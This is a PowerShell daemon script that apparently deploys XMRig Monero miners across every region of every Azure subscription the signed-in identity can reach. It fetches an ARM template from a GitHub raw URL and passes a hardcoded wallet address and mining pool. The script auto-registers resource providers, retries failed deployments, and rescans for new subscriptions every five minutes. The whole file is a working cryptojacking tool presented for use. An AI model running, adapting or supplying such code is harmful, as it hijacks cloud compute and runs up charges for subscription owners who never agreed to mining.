<#
.SYNOPSIS
    Daemon to deploy a mining ARM template to all locations in all Azure subscriptions.
.DESCRIPTION
    This script runs continuously in Cloud Shell. It discovers all available subscriptions,
    iterates through their supported locations, and deploys a Batch-based mining infrastructure
    using a unique name for each deployment to avoid conflicts. It includes robust error handling.
.NOTES
    File Name  : Deploy-MiningDaemon.ps1
    Requires   : Azure Cloud Shell or PowerShell with Az module
    Author     : Auto-generated
#>

# ============= CONFIGURATION =============
# The ARM template to deploy (GitHub raw URL)
$TemplateUri = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json"

# Your primary wallet address (overrides template defaults if needed)
$UserWallet = "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb"
# Your primary mining pool
$UserPool = "us-west.minexmr.com:4444"

# Prefix for created Resource Groups
$ResourceGroupPrefix = "crypto"

# Deployment concurrency and timing controls
$LocationBatchSize = 2        # Number of locations to process in parallel per subscription
$SecondsBetweenDeployments = 30
$SecondsBetweenSubscriptionScans = 300 # How often to rescan for new subscriptions (5 minutes)

# ============= FUNCTIONS =============
function Get-UniqueDeploymentIdentifier {
    param([string]$SubscriptionId, [string]$Location)
    # Creates a short, unique string based on sub ID, location, and time
    $subHash = $SubscriptionId.Substring(0, 8).ToLower()
    $locCode = $Location.Replace(' ', '').Replace('-', '').ToLower().Substring(0, 6)
    $timeStamp = (Get-Date).ToString("HHmm")
    $random = Get-Random -Minimum 100 -Maximum 999
    return "$subHash$locCode$timeStamp$random"
}

function Test-AzResourceProvider {
    param([string]$ProviderNamespace, [string]$SubscriptionId)
    # Checks if a required resource provider is registered
    Set-AzContext -Subscription $SubscriptionId | Out-Null
    $provider = Get-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction SilentlyContinue | Where-Object { $_.RegistrationState -eq "Registered" }
    if (-not $provider) {
        Write-Host "  Warning: Provider '$ProviderNamespace' not registered. Attempting registration..." -ForegroundColor Yellow
        try {
            Register-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction Stop | Out-Null
            Write-Host "  Provider registration initiated." -ForegroundColor Green
            # Wait a moment for registration to propagate
            Start-Sleep -Seconds 10
            return $true
        }
        catch {
            Write-Host "  Could not register provider: $_" -ForegroundColor Red
            return $false
        }
    }
    return $true
}

function Resolve-DeploymentError {
    param($ErrorRecord, $ResourceGroupName, $Location)
    # Analyzes common errors and suggests actions
    $message = $ErrorRecord.Exception.Message
    Write-Host "  Error Analysis: $message" -ForegroundColor Red

    # Common error: SKU not available in location
    if ($message -like "*SkuNotAvailable*" -or $message -like "*not available in location*") {
        Write-Host "  Action: The VM size (SKU) is not available in $Location. Skipping this location." -ForegroundColor Yellow
        return "SKIP_LOCATION"
    }
    # Common error: Quota exceeded
    if ($message -like "*QuotaExceeded*" -or $message -like "*OperationNotAllowed*") {
        Write-Host "  Action: Subscription quota exceeded for $Location. You may need to request a quota increase." -ForegroundColor Yellow
        return "QUOTA_ERROR"
    }
    # Common error: Resource provider not registered
    if ($message -like "*NoRegisteredProviderFound*" -or $message -like "*MissingSubscriptionRegistration*") {
        Write-Host "  Action: Required resource provider not registered. This may resolve on retry." -ForegroundColor Yellow
        return "RETRY"
    }
    # Common error: Deployment name/location conflict
    if ($message -like "*InvalidDeploymentLocation*") {
        Write-Host "  Action: Deployment name conflict. Generating a new unique name for retry." -ForegroundColor Yellow
        return "NEW_NAME"
    }
    # Common error: Policy violation
    if ($message -like "*RequestDisallowedByPolicy*") {
        Write-Host "  Action: Deployment blocked by Azure Policy. Check subscription policies." -ForegroundColor Yellow
        return "POLICY_BLOCK"
    }
    # Default action for other errors
    Write-Host "  Action: Unhandled error type. Deployment failed." -ForegroundColor Red
    return "FAIL"
}

function Invoke-SafeDeployment {
    param($SubscriptionContext, $Location, $TemplateParams, $MaxRetries = 2)
    # Core deployment function with retry logic
    $deploymentResult = $null
    $currentTry = 0
    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"

    while ($currentTry -le $MaxRetries) {
        $currentTry++
        $rgName = $baseRgName
        if ($currentTry -gt 1) {
            # On retry, append attempt number to resource group name
            $rgName = "$baseRgName-retry$currentTry"
            Write-Host "  Retry attempt $currentTry of $MaxRetries for $Location..." -ForegroundColor Yellow
        }

        Set-AzContext -Subscription $SubscriptionContext.Subscription.Id -Tenant $SubscriptionContext.Tenant.Id | Out-Null

        try {
            # 1. Create or get resource group
            $rg = Get-AzResourceGroup -Name $rgName -ErrorAction SilentlyContinue
            if (-not $rg) {
                Write-Host "  Creating Resource Group: $rgName" -ForegroundColor Gray
                $rg = New-AzResourceGroup -Name $rgName -Location $Location -Tag @{
                    DeployedBy   = "MiningDaemon";
                    DeploymentTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss");
                    Subscription = $SubscriptionContext.Subscription.Name;
                    TemplateUri  = [System.IO.Path]::GetFileName($TemplateUri);
                    Purpose      = "Cryptocurrency Mining"
                } -Force
                Start-Sleep -Seconds 5 # Brief pause after RG creation
            }

            # 2. Validate core resource providers are registered
            $requiredProviders = @("Microsoft.Batch", "Microsoft.Compute", "Microsoft.Storage", "Microsoft.Network")
            $allProvidersOk = $true
            foreach ($provider in $requiredProviders) {
                if (-not (Test-AzResourceProvider -ProviderNamespace $provider -SubscriptionId $SubscriptionContext.Subscription.Id)) {
                    $allProvidersOk = $false
                }
            }
            if (-not $allProvidersOk) {
                throw New-Object System.Exception("Required resource providers not available.")
            }

            # 3. Execute deployment with error rollback preference
            Write-Host "  Starting ARM deployment to $rgName..." -ForegroundColor Gray
            $deployment = New-AzResourceGroupDeployment `
                -ResourceGroupName $rgName `
                -TemplateUri $TemplateUri `
                -Name "deploy-$uniqueId" `
                -Location $Location `
                @TemplateParams `
                -Mode Incremental `
                -ErrorAction Stop

            Write-Host "  SUCCESS: Deployment to $Location completed." -ForegroundColor Green
            if ($deployment.Outputs) {
                foreach ($key in $deployment.Outputs.Keys) {
                    Write-Host "    $key : $($deployment.Outputs[$key].Value)" -ForegroundColor DarkGray
                }
            }
            $deploymentResult = @{Success = $true; ResourceGroup = $rgName; Outputs = $deployment.Outputs }
            break # Exit retry loop on success

        }
        catch {
            $errorAction = Resolve-DeploymentError -ErrorRecord $_ -ResourceGroupName $rgName -Location $Location

            switch ($errorAction) {
                "SKIP_LOCATION" {
                    $deploymentResult = @{Success = $false; Status = "Skipped"; Reason = "SKU not available" }
                    return $deploymentResult
                }
                "QUOTA_ERROR" {
                    $deploymentResult = @{Success = $false; Status = "Failed"; Reason = "Quota exceeded" }
                    return $deploymentResult # Don't retry quota errors
                }
                "POLICY_BLOCK" {
                    $deploymentResult = @{Success = $false; Status = "Blocked"; Reason = "Policy violation" }
                    return $deploymentResult
                }
                "NEW_NAME" {
                    # Continue loop with a new unique ID for next retry
                    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
                    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"
                    continue
                }
                "RETRY" {
                    if ($currentTry -lt $MaxRetries) {
                        Write-Host "  Waiting 30 seconds before retry..." -ForegroundColor Gray
                        Start-Sleep -Seconds 30
                        continue
                    }
                }
                default {
                    if ($currentTry -lt $MaxRetries) {
                        Write-Host "  Waiting 30 seconds before retry..." -ForegroundColor Gray
                        Start-Sleep -Seconds 30
                        continue
                    }
                }
            }
            # If we've exhausted retries
            $deploymentResult = @{Success = $false; Status = "Failed"; Reason = "Max retries exceeded"; Error = $_.Exception.Message }
        }
    }
    return $deploymentResult
}

function Invoke-LocationDeploymentJob {
    param($SubscriptionContext, $Location, $TemplateParams)
    # This function is designed to run in a separate job
    # It redefines the helper functions locally
    $ErrorActionPreference = 'Stop'
    
    # Redefine helper functions within the job context
    function Get-UniqueDeploymentIdentifier {
        param([string]$SubscriptionId, [string]$Location)
        $subHash = $SubscriptionId.Substring(0, 8).ToLower()
        $locCode = $Location.Replace(' ', '').Replace('-', '').ToLower().Substring(0, 6)
        $timeStamp = (Get-Date).ToString("HHmm")
        $random = Get-Random -Minimum 100 -Maximum 999
        return "$subHash$locCode$timeStamp$random"
    }
    
    function Resolve-DeploymentError {
        param($ErrorRecord, $ResourceGroupName, $Location)
        $message = $ErrorRecord.Exception.Message
        
        if ($message -like "*SkuNotAvailable*" -or $message -like "*not available in location*") {
            return "SKIP_LOCATION"
        }
        if ($message -like "*QuotaExceeded*" -or $message -like "*OperationNotAllowed*") {
            return "QUOTA_ERROR"
        }
        if ($message -like "*NoRegisteredProviderFound*" -or $message -like "*MissingSubscriptionRegistration*") {
            return "RETRY"
        }
        if ($message -like "*InvalidDeploymentLocation*") {
            return "NEW_NAME"
        }
        if ($message -like "*RequestDisallowedByPolicy*") {
            return "POLICY_BLOCK"
        }
        return "FAIL"
    }
    
    function Test-AzResourceProvider {
        param([string]$ProviderNamespace, [string]$SubscriptionId)
        Set-AzContext -Subscription $SubscriptionId | Out-Null
        $provider = Get-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction SilentlyContinue | Where-Object { $_.RegistrationState -eq "Registered" }
        if (-not $provider) {
            try {
                Register-AzResourceProvider -ProviderNamespace $ProviderNamespace -ErrorAction Stop | Out-Null
                Start-Sleep -Seconds 10
                return $true
            }
            catch {
                return $false
            }
        }
        return $true
    }
    
    # Main deployment logic for the job
    $deploymentResult = $null
    $currentTry = 0
    $MaxRetries = 2
    
    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"
    
    # Set context within the job
    Set-AzContext -Subscription $SubscriptionContext.Subscription.Id -Tenant $SubscriptionContext.Tenant.Id | Out-Null
    
    while ($currentTry -le $MaxRetries) {
        $currentTry++
        $rgName = $baseRgName
        if ($currentTry -gt 1) {
            $rgName = "$baseRgName-retry$currentTry"
        }
        
        try {
            # 1. Create or get resource group
            $rg = Get-AzResourceGroup -Name $rgName -ErrorAction SilentlyContinue
            if (-not $rg) {
                $rg = New-AzResourceGroup -Name $rgName -Location $Location -Tag @{
                    DeployedBy = "MiningDaemon";
                    DeploymentTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss");
                    Subscription = $SubscriptionContext.Subscription.Name;
                    TemplateUri = [System.IO.Path]::GetFileName($TemplateUri)
                } -Force
                Start-Sleep -Seconds 5
            }
            
            # 2. Validate core resource providers are registered
            $requiredProviders = @("Microsoft.Batch", "Microsoft.Compute", "Microsoft.Storage", "Microsoft.Network")
            $allProvidersOk = $true
            foreach ($provider in $requiredProviders) {
                if (-not (Test-AzResourceProvider -ProviderNamespace $provider -SubscriptionId $SubscriptionContext.Subscription.Id)) {
                    $allProvidersOk = $false
                }
            }
            if (-not $allProvidersOk) {
                throw New-Object System.Exception("Required resource providers not available.")
            }
            
            # 3. Execute deployment
            $deployment = New-AzResourceGroupDeployment `
                -ResourceGroupName $rgName `
                -TemplateUri $TemplateUri `
                -Name "deploy-$uniqueId" `
                -Location $Location `
                @TemplateParams `
                -Mode Incremental `
                -ErrorAction Stop
            
            $deploymentResult = @{
                Success = $true
                ResourceGroup = $rgName
                Outputs = $deployment.Outputs
            }
            break
            
        }
        catch {
            $errorAction = Resolve-DeploymentError -ErrorRecord $_ -ResourceGroupName $rgName -Location $Location
            
            switch ($errorAction) {
                "SKIP_LOCATION" {
                    $deploymentResult = @{Success = $false; Status = "Skipped"; Reason = "SKU not available" }
                    return $deploymentResult
                }
                "QUOTA_ERROR" {
                    $deploymentResult = @{Success = $false; Status = "Failed"; Reason = "Quota exceeded" }
                    return $deploymentResult
                }
                "POLICY_BLOCK" {
                    $deploymentResult = @{Success = $false; Status = "Blocked"; Reason = "Policy violation" }
                    return $deploymentResult
                }
                "NEW_NAME" {
                    $uniqueId = Get-UniqueDeploymentIdentifier -SubscriptionId $SubscriptionContext.Subscription.Id -Location $Location
                    $baseRgName = "$ResourceGroupPrefix-$($Location.ToLower().Replace(' ', '-').Replace('--', '-'))-$uniqueId"
                    continue
                }
                default {
                    if ($currentTry -lt $MaxRetries) {
                        Start-Sleep -Seconds 30
                        continue
                    }
                }
            }
            
            $deploymentResult = @{
                Success = $false
                Status = "Failed"
                Reason = "Max retries exceeded"
                Error = $_.Exception.Message
            }
        }
    }
    
    return $deploymentResult
}

# ============= MAIN DAEMON LOOP =============
Write-Host "=================================================================================" -ForegroundColor Cyan
Write-Host "AZURE MINING DEPLOYMENT DAEMON" -ForegroundColor Yellow
Write-Host "Started at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
Write-Host "Template: $TemplateUri" -ForegroundColor Cyan
Write-Host "Target: All locations in all subscriptions" -ForegroundColor Cyan
Write-Host "=================================================================================" -ForegroundColor Cyan
Write-Host "`n"

# Ensure we are connected to Azure
try {
    Connect-AzAccount -Identity -ErrorAction SilentlyContinue | Out-Null
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connected via Managed Identity." -ForegroundColor Green
}
catch {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Managed Identity not available. Attempting interactive login." -ForegroundColor Yellow
    Connect-AzAccount | Out-Null
}

$globalDeploymentLog = @()
$daemonIteration = 0

# SIMPLIFIED VERSION: Remove Job parallelism to avoid scope issues
while ($true) {
    $daemonIteration++
    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Daemon Iteration: $daemonIteration" -ForegroundColor Magenta
    Write-Host "Scanning for subscriptions..." -ForegroundColor Gray

    $allSubscriptions = Get-AzSubscription -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Enabled' }
    Write-Host "Found $($allSubscriptions.Count) enabled subscriptions." -ForegroundColor Green

    foreach ($sub in $allSubscriptions) {
        Write-Host "`n--- Processing Subscription: $($sub.Name) ($($sub.Id)) ---" -ForegroundColor White -BackgroundColor DarkBlue
        $subContext = Get-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue
        if (-not $subContext) {
            Set-AzContext -Subscription $sub.Id | Out-Null
            $subContext = Get-AzContext
        }

        # Get available locations for Batch/Compute services
        $locations = @()
        try {
            $locations = (Get-AzLocation | Where-Object {
                $_.Providers -contains "Microsoft.Batch" -and
                $_.Providers -contains "Microsoft.Compute" -and
                $_.Location -notlike "*stage*" -and
                $_.Location -notlike "*test*"
            }).Location | Sort-Object | Get-Unique
        }
        catch {
            Write-Host "  Could not fetch locations for subscription. Skipping." -ForegroundColor Red
            continue
        }

        if ($locations.Count -eq 0) {
            Write-Host "  No suitable locations found in this subscription." -ForegroundColor Yellow
            continue
        }
        Write-Host "  Targeting $($locations.Count) locations." -ForegroundColor Cyan

        # Prepare template parameters (override defaults from template if necessary)
        $templateParameters = @{
            user_wallet                = $UserWallet
            user_pool_port             = $UserPool
            batchAccounts_batches_name = "batch-$(Get-Random -Minimum 10000 -Maximum 99999)" # Force a unique batch account name
        }

        # Process locations sequentially (simplified to avoid job scope issues)
        foreach ($loc in $locations) {
            Write-Host "  Processing location: $loc" -ForegroundColor Gray
            
            # Use the main function directly (not in a job)
            $result = Invoke-SafeDeployment -SubscriptionContext $subContext -Location $loc -TemplateParams $templateParameters
            
            $globalDeploymentLog += [PSCustomObject]@{
                Timestamp     = Get-Date
                Subscription  = $sub.Name
                Location      = $loc
                Success       = $result.Success
                ResourceGroup = $result.ResourceGroup
                Status        = $result.Status
                Reason        = $result.Reason
            }
            
            # Brief pause between locations
            if ($loc -ne $locations[-1]) {
                Start-Sleep -Seconds $SecondsBetweenDeployments
            }
        }
        Write-Host "  Finished subscription: $($sub.Name)" -ForegroundColor Green
    }

    # Summary of this iteration
    $successCount = ($globalDeploymentLog | Where-Object { $_.Success -eq $true }).Count
    $failCount = ($globalDeploymentLog | Where-Object { $_.Success -eq $false -and $_.Status -ne 'Skipped' }).Count
    $skipCount = ($globalDeploymentLog | Where-Object { $_.Status -eq 'Skipped' }).Count
    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Iteration $daemonIteration Complete." -ForegroundColor Magenta
    Write-Host "  Total deployments processed in this run: $($globalDeploymentLog.Count)" -ForegroundColor Cyan
    Write-Host "  Successful: $successCount" -ForegroundColor Green
    Write-Host "  Failed/Blocked: $failCount" -ForegroundColor $(if ($failCount -gt 0) { 'Red' } else { 'Gray' })
    Write-Host "  Skipped (e.g., SKU not available): $skipCount" -ForegroundColor Yellow

    # Save log to Cloud Shell persistent storage
    $logPath = "$HOME/clouddrive/MiningDeployments_$(Get-Date -Format 'yyyyMMdd').csv"
    $globalDeploymentLog | Export-Csv -Path $logPath -NoTypeInformation -Append
    Write-Host "  Log saved to: $logPath" -ForegroundColor Gray

    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Daemon sleeping for ${SecondsBetweenSubscriptionScans} seconds..." -ForegroundColor DarkGray
    Write-Host "=================================================================================" -ForegroundColor DarkGray
    Start-Sleep -Seconds $SecondsBetweenSubscriptionScans
}
